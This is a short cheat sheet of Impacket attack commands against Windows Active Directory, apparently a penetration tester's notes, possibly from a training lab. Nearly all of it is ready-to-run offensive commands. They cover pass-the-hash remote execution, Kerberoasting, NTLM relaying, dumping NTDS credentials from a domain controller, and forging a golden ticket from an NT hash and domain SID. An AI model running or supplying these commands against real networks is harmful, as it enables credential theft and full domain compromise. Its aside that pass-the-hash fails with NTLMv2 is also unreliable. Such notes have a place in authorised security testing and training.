impacket

Passing the hash only works with NTLM, not NTLMv2

~~~bash
impacket-psexec "username":password@ipaddress
~~~

~~~bash
impacket-psexec "username":@ipaddress -hashes FullNTLM:Hash
~~~

~~~bash
impacket-GetUserSPNs Domain/Username:Password -dc-ip [Domain Controller IP] -request
~~~

~~~bash
impacket-smbserver share 'pwd' -smb2support
~~~

~~~bash
impacket-rpcdump @victimIP | egrep 'MS-RPRN|MS-PAR'
~~~

~~~bash
impacket-ntlmrelayx -smb2support -tf targets.txt
~~~

~~~bash
Impacket-GetUserSPNs FQDN/Username:Password -output tgs.txt -dc-ip DC_IP
~~~

~~~bash
impacket-ticketconverter user.kirbi user.ccache
~~~

dumping ntds from DC using ccache and secrets dump:

~~~bash
KRB5CCNAME=/home/kali/user.ccache impacket-secretsdump -k -no-pass -dc-ip DC_IP -target-ip DC_IP Server.FQDN
~~~

~~~bash
impacket-ticketer -nthash 26bddd6c25e8ee0f6bbbcf6d9c5e4c26 -domain-sid S-1-5-21-4221735399-2339777703-2054613801 -domain training.rt.bluebastion.net da.admin
~~~

~~~bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks --output-file hashes.txt
~~~

